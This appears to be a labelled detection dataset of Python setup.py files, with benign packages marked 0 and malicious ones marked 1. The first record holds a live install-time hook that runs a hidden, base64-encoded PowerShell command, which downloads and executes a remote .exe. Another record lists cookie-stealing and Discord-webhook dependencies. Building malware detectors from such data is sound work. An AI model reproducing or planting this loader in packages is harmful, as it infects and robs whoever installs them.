{"idx": "libvisaurlgui-9.72", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvisaurlgui',\n    packages = ['modlib'],\n    version = '3.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "googledrivedownloader-0.4", "func": "from setuptools import setup\n\nsetup(\n    name='googledrivedownloader',\n    version='0.4',\n    packages=['google_drive_downloader'],\n    url='https://github.com/ndrplz/google-drive-downloader',\n    license='MIT',\n    author='Davide Abati and Andrea Palazzi',\n    author_email='ndrplz@gmail.com',\n    description='Minimal class to download shared files from Google Drive.'\n)\n", "target": 0}
{"idx": "xolotopgrabber-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolotopgrabber', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "flake8-return-1.1.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_return']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8-plugin-utils>=1.0,<2.0']\n\nentry_points = \\\n{'flake8.extension': ['R50 = flake8_return.plugin:ReturnPlugin']}\n\nsetup_kwargs = {\n    'name': 'flake8-return',\n    'version': '1.1.3',\n    'description': 'Flake8 plugin that checks return values',\n    'long_description': '# flake8-return\\n\\n[![pypi](https://badge.fury.io/py/flake8-return.svg)](https://pypi.org/project/flake8-return)\\n[![Python: 3.6+](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://pypi.org/project/flake8-return)\\n[![Downloads](https://img.shields.io/pypi/dm/flake8-return.svg)](https://pypistats.org/packages/flake8-return)\\n[![Build Status](https://travis-ci.org/Afonasev/flake8-return.svg?branch=master)](https://travis-ci.org/Afonasev/flake8-return)\\n[![Code coverage](https://codecov.io/gh/afonasev/flake8-return/branch/master/graph/badge.svg)](https://codecov.io/gh/afonasev/flake8-return)\\n[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://en.wikipedia.org/wiki/MIT_License)\\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/ambv/black)\\n\\nFlake8 plugin that checks return values.\\n\\n## Installation\\n\\n```bash\\npip install flake8-return\\n```\\n\\n## Errors\\n\\n* R501 do not explicitly return None in function if it is the only possible return value.\\n\\n```python\\ndef x(y):\\n    if not y:\\n        return\\n    return None  # error!\\n```\\n\\n* R502 do not implicitly return None in function able to return non-None value.\\n\\n```python\\ndef x(y):\\n    if not y:\\n        return  # error!\\n    return 1\\n```\\n\\n* R503 missing explicit return at the end of function able to return non-None value.\\n\\n```python\\ndef x(y):\\n    if not y:\\n        return 1\\n    # error!\\n```\\n\\n* R504 unecessary variable assignement before return statement.\\n\\n```python\\ndef x():\\n    a = 1\\n    # some code that not using `a`\\n    print(\\'test\\')\\n    return a  # error!\\n```\\n\\nReturns in asyncio coroutines also supported.\\n\\n## For developers\\n\\n### Show help\\n\\n    make help\\n\\n### Create venv and install deps\\n\\n    make init\\n\\n### Install git precommit hook\\n\\n    make precommit\\n\\n### Run linters, autoformat, tests etc.\\n\\n    make pretty lint test\\n\\n### Bump new version\\n\\n    make bump_major\\n    make bump_minor\\n    make bump_patch\\n\\n## Change Log\\n\\nUnreleased\\n-----\\n\\n* ...\\n\\n1.1.3 - 2021-05-05\\n-----\\n\\n* Error clarifications (#77) Cl\u00e9ment Robert\\n* fix linting (migrate to black 20.0b1) (#78) Cl\u00e9ment Robert\\n\\n1.1.2 - 2020-07-09\\n-----\\n\\n* Make R504 visitors handle while loops (#56) Frank Tackitt\\n* Rename allows-prereleases to allow-prereleases (#55) Frank Tackitt\\n* Fix typo: havn\\'t \u2192 haven\\'t (#24) Jon Dufresne\\n\\n1.1.1 - 2019-09-21\\n-----\\n\\n* fixed [#3](https://github.com/afonasev/flake8-return/issues/3) The R504 doesn\\'t detect that the variable is modified in loop\\n* fixed [#4](https://github.com/afonasev/flake8-return/issues/4) False positive with R503 inside async with clause\\n\\n1.1.0 - 2019-05-23\\n-----\\n\\n* update flask_plugin_utils version to 1.0\\n\\n1.0.0 - 2019-05-13\\n-----\\n\\n* skip assign after unpacking while unnecessary assign checking \"(x, y = my_obj)\"\\n\\n0.3.2 - 2019-04-01\\n-----\\n\\n* allow \"assert False\" as last function return\\n\\n0.3.1 - 2019-03-11\\n-----\\n\\n* add pypi deploy into travis config\\n* add make bump_version command\\n\\n0.3.0 - 2019-02-26\\n-----\\n\\n* skip functions that consist only `return None`\\n* fix false positive when last return inner with statement\\n* add unnecessary assign error\\n* add support tuple in assign or return expressions\\n* add suppport asyncio coroutines\\n\\n0.2.0 - 2019-02-21\\n-----\\n\\n* fix explicit/implicit\\n* add flake8-plugin-utils as dependency\\n* allow raise as last function return\\n* allow no return as last line in while block\\n* fix if/elif/else cases\\n\\n0.1.1 - 2019-02-10\\n-----\\n\\n* fix error messages\\n\\n0.1.0 - 2019-02-10\\n-----\\n\\n* initial\\n',\n    'author': 'Afonasev Evgeniy',\n    'author_email': 'ea.afonasev@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://pypi.org/project/flake8-return',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "graphqlclient-0.2.4", "func": "from setuptools import setup\n\nwith open('README.md', 'r') as fh:\n    long_description = fh.read()\n\nsetup(name='graphqlclient',\n      version='0.2.4',\n      description='Simple GraphQL client for Python 2.7+',\n      long_description=long_description,\n      long_description_content_type='text/markdown',\n      url='https://github.com/prismagraphql/python-graphql-client',\n      author='prisma.io',\n      author_email='hello@prisma.io',\n      license='MIT',\n      packages=['graphqlclient'],\n      install_requires=[\n          'six',\n      ],\n      zip_safe=False)\n", "target": 0}
{"idx": "django-health-check-3.16.5", "func": "#!/usr/bin/env python\nfrom setuptools import setup\n\nsetup(use_scm_version=True)\n", "target": 0}
{"idx": "google-compute-engine-2.8.13", "func": "#!/usr/bin/python\n# Copyright 2016 Google Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Create a Python package of the Linux guest environment.\"\"\"\n\nimport glob\nimport sys\n\nimport setuptools\n\ninstall_requires = ['boto', 'setuptools']\nif sys.version_info >= (3, 6):\n  install_requires += ['distro']\n\nsetuptools.setup(\n    author='Google Compute Engine Team',\n    author_email='gc-team@google.com',\n    description='Google Compute Engine',\n    include_package_data=True,\n    install_requires=install_requires,\n    license='Apache Software License',\n    long_description='Google Compute Engine guest environment.',\n    name='google-compute-engine',\n    packages=setuptools.find_packages(),\n    scripts=glob.glob('scripts/*'),\n    url='https://github.com/GoogleCloudPlatform/compute-image-packages',\n    version='2.8.13',\n    # Entry points create scripts in /usr/bin that call a function.\n    entry_points={\n        'console_scripts': [\n            'google_accounts_daemon=google_compute_engine.accounts.accounts_daemon:main',\n            'google_clock_skew_daemon=google_compute_engine.clock_skew.clock_skew_daemon:main',\n            'google_instance_setup=google_compute_engine.instance_setup.instance_setup:main',\n            'google_network_daemon=google_compute_engine.networking.network_daemon:main',\n            'google_metadata_script_runner=google_compute_engine.metadata_scripts.script_manager:main',\n        ],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: No Input/Output (Daemon)',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: POSIX :: Linux',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Internet',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: System :: Installation/Setup',\n        'Topic :: System :: Systems Administration',\n    ],\n)\n", "target": 0}
{"idx": "google-cloud-workflows-1.7.1", "func": "# -*- coding: utf-8 -*-\n\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\nimport setuptools  # type: ignore\n\nversion = \"1.7.1\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nsetuptools.setup(\n    name=\"google-cloud-workflows\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-workflows\",\n    packages=packages,\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n        \"proto-plus >= 1.15.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <4.0.0dev\",\n    ),\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "dict2xml-1.7.1", "func": "from dict2xml import VERSION\nfrom setuptools import setup\n\n# fmt: off\n\n# Setup the project\nsetup(\n      name = \"dict2xml\"\n    , version = VERSION\n    , packages = ['dict2xml']\n    \n    , python_requires = \">= 3.5\"\n\n    , extras_require =\n      { 'tests' :\n        [ \"noseOfYeti==2.1.0\"\n        , \"pytest==6.2.5\"\n        ]\n      }\n\n    , classifiers =\n      [ \"Development Status :: 5 - Production/Stable\"\n      , \"License :: OSI Approved :: MIT License\"\n      , \"Operating System :: OS Independent\"\n      , \"Programming Language :: Python\"\n      , \"Programming Language :: Python :: 3\"\n      , \"Topic :: Software Development :: Libraries :: Python Modules\"\n      , \"Topic :: Text Processing :: Markup :: XML\"\n      ]\n\n    # metadata\n    , url = \"http://github.com/delfick/python-dict2xml\"\n    , author = \"Stephen Moore\"\n    , author_email = \"stephen@delfick.com\"\n    , description = \"Small utility to convert a python dictionary into an XML string\"\n    , long_description = open(\"README.rst\").read()\n    , license = \"MIT\"\n    )\n\n# fmt: on\n", "target": 0}
{"idx": "diff_cover-6.5.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['diff_cover', 'diff_cover.violationsreporters']\n\npackage_data = \\\n{'': ['*'], 'diff_cover': ['templates/*']}\n\ninstall_requires = \\\n['Jinja2>=2.7.1',\n 'Pygments>=2.9.0,<3.0.0',\n 'chardet>=3.0.0',\n 'pluggy>=0.13.1,<2']\n\nextras_require = \\\n{':python_version < \"3.8\"': ['setuptools>=17.0.0'], 'toml': ['tomli>=1.2.1']}\n\nentry_points = \\\n{'console_scripts': ['diff-cover = diff_cover.diff_cover_tool:main',\n                     'diff-quality = diff_cover.diff_quality_tool:main']}\n\nsetup_kwargs = {\n    'name': 'diff-cover',\n    'version': '6.5.1',\n    'description': 'Run coverage and linting reports on diffs',\n    'long_description': 'diff-cover |pypi-version| |conda-version| |build-status|\\n========================================================================================\\n\\nAutomatically find diff lines that need test coverage.\\nAlso finds diff lines that have violations (according to tools such\\nas pycodestyle, pyflakes, flake8, or pylint).\\nThis is used as a code quality metric during code reviews.\\n\\nOverview\\n--------\\n\\nDiff coverage is the percentage of new or modified\\nlines that are covered by tests.  This provides a clear\\nand achievable standard for code review: If you touch a line\\nof code, that line should be covered.  Code coverage\\nis *every* developer\\'s responsibility!\\n\\nThe ``diff-cover`` command line tool compares an XML coverage report\\nwith the output of ``git diff``.  It then reports coverage information\\nfor lines in the diff.\\n\\nCurrently, ``diff-cover`` requires that:\\n\\n- You are using ``git`` for version control.\\n- Your test runner generates coverage reports in Cobertura, Clover\\n  or JaCoCo XML format.\\n\\nSupported XML coverage reports can be generated with many coverage tools,\\nincluding:\\n\\n- Cobertura__ (Java)\\n- Clover__ (Java)\\n- JaCoCo__ (Java)\\n- coverage.py__ (Python)\\n- JSCover__ (JavaScript)\\n- lcov_to_cobertura__ (C/C++)\\n\\n__ http://cobertura.sourceforge.net/\\n__ http://openclover.org/\\n__ https://www.jacoco.org/\\n__ http://nedbatchelder.com/code/coverage/\\n__ http://tntim96.github.io/JSCover/\\n__ https://github.com/eriwen/lcov-to-cobertura-xml\\n\\n\\n``diff-cover`` is designed to be extended.  If you are interested\\nin adding support for other version control systems or coverage\\nreport formats, see below for information on how to contribute!\\n\\n\\nInstallation\\n------------\\n\\nTo install the latest release:\\n\\n.. code:: bash\\n\\n    pip install diff_cover\\n\\n\\nTo install the development version:\\n\\n.. code:: bash\\n\\n    git clone https://github.com/Bachmann1234/diff-cover.git\\n    cd diff-cover\\n    python setup.py install\\n\\n\\nGetting Started\\n---------------\\n\\n1. Set the current working directory to a ``git`` repository.\\n\\n2. Run your test suite under coverage and generate a [Cobertura, Clover or JaCoCo] XML report.\\n   For example, using `pytest-cov`__:\\n\\n.. code:: bash\\n\\n    pytest --cov --cov-report=xml\\n\\n__ https://pypi.org/project/pytest-cov\\n\\nThis will create a ``coverage.xml`` file in the current working directory.\\n\\n**NOTE**: If you are using a different coverage generator, you will\\nneed to use different commands to generate the coverage XML report.\\n\\n\\n3. Run ``diff-cover``:\\n\\n.. code:: bash\\n\\n    diff-cover coverage.xml\\n\\nThis will compare the current ``git`` branch to ``origin/main`` and print\\nthe diff coverage report to the console.\\n\\nYou can also generate an HTML, JSON or Markdown version of the report:\\n\\n.. code:: bash\\n\\n    diff-cover coverage.xml --html-report report.html\\n    diff-cover coverage.xml --json-report report.json\\n    diff-cover coverage.xml --markdown-report report.md\\n\\nMultiple XML Coverage Reports\\n-------------------------------\\n\\nIn the case that one has multiple xml reports form multiple test suites, you\\ncan get a combined coverage report (a line is counted  as covered if it is\\ncovered in ANY of the xml reports) by running ``diff-cover`` with multiple\\ncoverage reports as arguments. You may specify any arbitrary number of coverage\\nreports:\\n\\n.. code:: bash\\n\\n    diff-cover coverage1.xml coverage2.xml\\n\\nQuality Coverage\\n-----------------\\nYou can use diff-cover to see quality reports on the diff as well by running\\n``diff-quality``.\\n\\n.. code :: bash\\n\\n    diff-quality --violations=<tool>\\n\\nWhere ``tool`` is the quality checker to use. Currently ``pycodestyle``, ``pyflakes``,\\n``flake8``, ``pylint``, ``checkstyle``, ``checkstylexml`` are supported, but more\\ncheckers can (and should!) be supported. See the section \"Adding `diff-quality``\\nSupport for a New Quality Checker\".\\n\\nNOTE: There\\'s no way to run ``findbugs`` from ``diff-quality`` as it operating\\nover the generated java bytecode and should be integrated into the build\\nframework.\\n\\nLike ``diff-cover``, HTML, JSON or Markdown reports can be generated with\\n\\n.. code:: bash\\n\\n    diff-quality --violations=<tool> --html-report report.html\\n    diff-quality --violations=<tool> --json-report report.json\\n    diff-quality --violations=<tool> --markdown-report report.md\\n\\nIf you have already generated a report using ``pycodestyle``, ``pyflakes``, ``flake8``,\\n``pylint``, ``checkstyle``, ``checkstylexml``, or ``findbugs`` you can pass the report\\nto ``diff-quality``.  This is more efficient than letting ``diff-quality`` re-run\\n``pycodestyle``, ``pyflakes``, ``flake8``, ``pylint``, ``checkstyle``, or ``checkstylexml``.\\n\\n.. code:: bash\\n\\n    # For pylint < 1.0\\n    pylint -f parseable > pylint_report.txt\\n\\n    # For pylint >= 1.0\\n    pylint --msg-template=\"{path}:{line}: [{msg_id}({symbol}), {obj}] {msg}\" > pylint_report.txt\\n\\n    # Use the generated pylint report when running diff-quality\\n    diff-quality --violations=pylint pylint_report.txt\\n\\n    # Use a generated pycodestyle report when running diff-quality.\\n    pycodestyle > pycodestyle_report.txt\\n    diff-quality --violations=pycodestyle pycodestyle_report.txt\\n\\nNote that you must use the ``-f parseable`` option to generate\\nthe ``pylint`` report for pylint versions less than 1.0 and the\\n``--msg-template`` option for versions >= 1.0.\\n\\n``diff-quality`` will also accept multiple ``pycodestyle``, ``pyflakes``, ``flake8``,\\nor ``pylint`` reports:\\n\\n.. code:: bash\\n\\n    diff-quality --violations=pylint report_1.txt report_2.txt\\n\\nIf you need to pass in additional options you can with the ``options`` flag\\n\\n.. code:: bash\\n\\n    diff-quality --violations=pycodestyle --options=\"--exclude=\\'*/migrations*\\' --statistics\" pycodestyle_report.txt\\n\\nCompare Branch\\n--------------\\n\\nBy default, ``diff-cover`` compares the current branch to ``origin/main``.  To specify a different compare branch:\\n\\n.. code:: bash\\n\\n    diff-cover coverage.xml --compare-branch=origin/release\\n\\nFail Under\\n----------\\n\\nTo have ``diff-cover`` and ``diff-quality`` return a non zero status code if the report quality/coverage percentage is\\nbelow a certain threshold specify the fail-under parameter\\n\\n.. code:: bash\\n\\n    diff-cover coverage.xml --fail-under=80\\n    diff-quality --violations=pycodestyle --fail-under=80\\n\\nThe above will return a non zero status if the coverage or quality score was below 80%.\\n\\nExclude/Include paths\\n---------------------\\n\\nExplicit exclusion of paths is possible for both ``diff-cover`` and ``diff-quality``, while inclusion is\\nonly supported for ``diff-quality`` (since 5.1.0).\\n\\nThe exclude option works with ``fnmatch``, include with ``glob``. Both options can consume multiple values.\\nInclude options should be wrapped in double quotes to prevent shell globbing. Also they should be relative to\\nthe current git directory.\\n\\n.. code:: bash\\n\\n    diff-cover coverage.xml --exclude setup.py\\n    diff-quality --violations=pycodestyle --exclude setup.py\\n\\n    diff-quality --violations=pycodestyle --include project/foo/**\\n\\nThe following is executed for every changed file:\\n\\n#. check if any include pattern was specified\\n#. if yes, check if the changed file is part of at least one include pattern\\n#. check if the file is part of any exclude pattern\\n\\nIgnore/Include based on file status in git\\n------------------------------------------\\nBoth ``diff-cover`` and ``diff-quality`` allow users to ignore and include files based on the git\\nstatus: staged, unstaged, untracked:\\n\\n* ``--ignore-staged``: ignore all staged files (by default include them)\\n* ``--ignore-unstaged``: ignore all unstaged files (by default include them)\\n* ``--include-untracked``: include all untracked files (by default ignore them)\\n\\nQuiet mode\\n----------\\nBoth ``diff-cover`` and ``diff-quality`` support a quiet mode which is disable by default.\\nIt can be enabled by using the ``-q``/``--quiet`` flag:\\n\\n.. code:: bash\\n\\n    diff-cover coverage.xml -q\\n    diff-quality --violations=pycodestyle -q\\n\\nIf enabled, the tool will only print errors and failures but no information or warning messages.\\n\\nConfiguration files\\n-------------------\\nBoth tools allow users to specify the options in a configuration file with `--config-file`/`-c`:\\n\\n.. code:: bash\\n\\n    diff-cover coverage.xml --config-file myconfig.toml\\n    diff-quality --violations=pycodestyle --config-file myconfig.toml\\n\\nCurrently, only TOML files are supported.\\nPlease note, that only non-mandatory options are supported.\\nIf an option is specified in the configuration file and over the command line, the value of the\\ncommand line is used.\\n\\nTOML configuration\\n~~~~~~~~~~~~~~~~~~\\n\\nThe parser will only react to configuration files ending with `.toml`.\\nTo use it, install `diff-cover` with the extra requirement `toml`.\\n\\nThe option names are the same as on the command line, but all dashes should be underscores.\\nIf an option can be specified multiple times, the configuration value should be specified as a list.\\n\\n.. code:: toml\\n\\n    [tool.diff_cover]\\n    compare_branch = \"origin/feature\"\\n    quiet = true\\n\\n    [tool.diff_quality]\\n    compare_branch = \"origin/feature\"\\n    ignore_staged = true\\n\\n\\nTroubleshooting\\n----------------------\\n\\n**Issue**: ``diff-cover`` always reports: \"No lines with coverage information in this diff.\"\\n\\n**Solution**: ``diff-cover`` matches source files in the coverage XML report with\\nsource files in the ``git diff``.  For this reason, it\\'s important\\nthat the relative paths to the files match.  If you are using `coverage.py`__\\nto generate the coverage XML report, then make sure you run\\n``diff-cover`` from the same working directory.\\n\\n__ http://nedbatchelder.com/code/coverage/\\n\\n**Issue**: ``GitDiffTool._execute()`` raises the error:\\n\\n.. code:: bash\\n\\n    fatal: ambiguous argument \\'origin/main...HEAD\\': unknown revision or path not in the working tree.\\n\\nThis is known to occur when running ``diff-cover`` in `Travis CI`__\\n\\n__ http://travis-ci.org\\n\\n**Solution**: Fetch the remote main branch before running ``diff-cover``:\\n\\n.. code:: bash\\n\\n    git fetch origin master:refs/remotes/origin/main\\n\\n**Issue**: ``diff-quality`` reports \"diff_cover.violations_reporter.QualityReporterError:\\nNo config file found, using default configuration\"\\n\\n**Solution**: Your project needs a `pylintrc` file.\\nProvide this file (it can be empty) and ``diff-quality`` should run without issue.\\n\\n**Issue**: ``diff-quality`` reports \"Quality tool not installed\"\\n\\n**Solution**: ``diff-quality`` assumes you have the tool you wish to run against your diff installed.\\nIf you do not have it then install it with your favorite package manager.\\n\\n**Issue**: ``diff-quality`` reports no quality issues\\n\\n**Solution**: You might use a pattern like ``diff-quality --violations foo *.py``. The last argument\\nis not used to specify the files but for the quality tool report. Remove it to resolve the issue\\n\\nLicense\\n-------\\n\\nThe code in this repository is licensed under the Apache 2.0 license.\\nPlease see ``LICENSE.txt`` for details.\\n\\n\\nHow to Contribute\\n-----------------\\n\\nContributions are very welcome. The easiest way is to fork this repo, and then\\nmake a pull request from your fork.\\n\\nNOTE: ``diff-quality`` supports a plugin model, so new tools can be integrated\\nwithout requiring changes to this repo. See the section \"Adding `diff-quality``\\nSupport for a New Quality Checker\".\\n\\nSetting Up For Development\\n~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\\nThis project is managed with `poetry` this can be installed with `pip`\\npoetry manages a python virtual environment and organizes dependencies. It also\\npackages this project.\\n\\n.. code:: bash\\n\\n    pip install poetry\\n\\n.. code:: bash\\n\\n    poetry install\\n\\nI would also suggest running this command after. This will make it so git blame ignores the commit\\nthat formatted the entire codebase.\\n\\n.. code:: bash\\n\\n    git config blame.ignoreRevsFile .git-blame-ignore-revs\\n\\n\\nAdding `diff-quality`` Support for a New Quality Checker\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\nAdding support for a new quality checker is simple. ``diff-quality`` supports\\nplugins using the popular Python\\n`pluggy package <https://pluggy.readthedocs.io/en/latest/>`_.\\n\\nIf the quality checker is already implemented as a Python package, great! If not,\\n`create a Python package <https://packaging.python.org/tutorials/packaging-projects/>`_\\nto host the plugin implementation.\\n\\nIn the Python package\\'s ``setup.py`` file, define an entry point for the plugin,\\ne.g.\\n\\n.. code:: python\\n\\n    setup(\\n        ...\\n        entry_points={\\n            \\'diff_cover\\': [\\n                \\'sqlfluff = sqlfluff.diff_quality_plugin\\'\\n            ],\\n        },\\n        ...\\n    )\\n\\nNotes:\\n\\n* The dictionary key for the entry point must be named ``diff_cover``\\n* The value must be in the format ``TOOL_NAME = YOUR_PACKAGE.PLUGIN_MODULE``\\n\\nWhen your package is installed, ``diff-quality`` uses this information to\\nlook up the tool package and module based on the tool name provided to the\\n``--violations`` option of the ``diff-quality`` command, e.g.:\\n\\n.. code:: bash\\n\\n    $ diff-quality --violations sqlfluff\\n\\nThe plugin implementation will look something like the example below. This is\\na simplified example based on a working plugin implementation.\\n\\n.. code:: python\\n\\n    from diff_cover.hook import hookimpl as diff_cover_hookimpl\\n    from diff_cover.violationsreporters.base import BaseViolationReporter, Violation\\n\\n    class SQLFluffViolationReporter(BaseViolationReporter):\\n        supported_extensions = [\\'sql\\']\\n\\n        def __init__(self):\\n            super(SQLFluffViolationReporter, self).__init__(\\'sqlfluff\\')\\n\\n        def violations(self, src_path):\\n            return [\\n                Violation(violation.line_number, violation.description)\\n                for violation in get_linter().get_violations(src_path)\\n            ]\\n\\n        def measured_lines(self, src_path):\\n            return None\\n\\n        @staticmethod\\n        def installed():\\n            return True\\n\\n\\n    @diff_cover_hookimpl\\n    def diff_cover_report_quality():\\n        return SQLFluffViolationReporter()\\n\\nImportant notes:\\n\\n* ``diff-quality`` is looking for a plugin function:\\n\\n  * Located in your package\\'s module that was listed in the ``setup.py`` entry point.\\n  * Marked with the ``@diff_cover_hookimpl`` decorator\\n  * Named ``diff_cover_report_quality``. (This distinguishes it from any other\\n    plugin types ``diff_cover`` may support.)\\n* The function should return an object with the following properties and methods:\\n\\n  * ``supported_extensions`` property with a list of supported file extensions\\n  * ``violations()`` function that returns a list of ``Violation`` objects for\\n    the specified ``src_path``. For more details on this function and other\\n    possible reporting-related methods, see the ``BaseViolationReporter`` class\\n    `here <https://github.com/Bachmann1234/diff_cover/blob/main/diff_cover/violationsreporters/base.py>`_.\\n\\nSpecial Thanks\\n-------------------------\\n\\nShout out to the original author of diff-cover `Will Daly\\n<https://github.com/wedaly>`_ and the original author of diff-quality `Sarina Canelake\\n<https://github.com/sarina>`_.\\n\\nOriginally created with the support of `edX\\n<https://github.com/edx>`_.\\n\\n\\n.. |pypi-version| image:: https://img.shields.io/pypi/v/diff-cover.svg\\n    :target: https://pypi.org/project/diff-cover\\n    :alt: PyPI version\\n.. |conda-version| image:: https://img.shields.io/conda/vn/conda-forge/diff-cover.svg\\n    :target: https://anaconda.org/conda-forge/diff-cover\\n    :alt: Conda version\\n.. |build-status| image:: https://github.com/bachmann1234/diff_cover/actions/workflows/verify.yaml/badge.svg?branch=main\\n    :target: https://github.com/Bachmann1234/diff_cover/actions/workflows/verify.yaml\\n    :alt: Build Status\\n',\n    'author': 'See Contributors',\n    'author_email': None,\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/Bachmann1234/diff-cover',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6.2,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
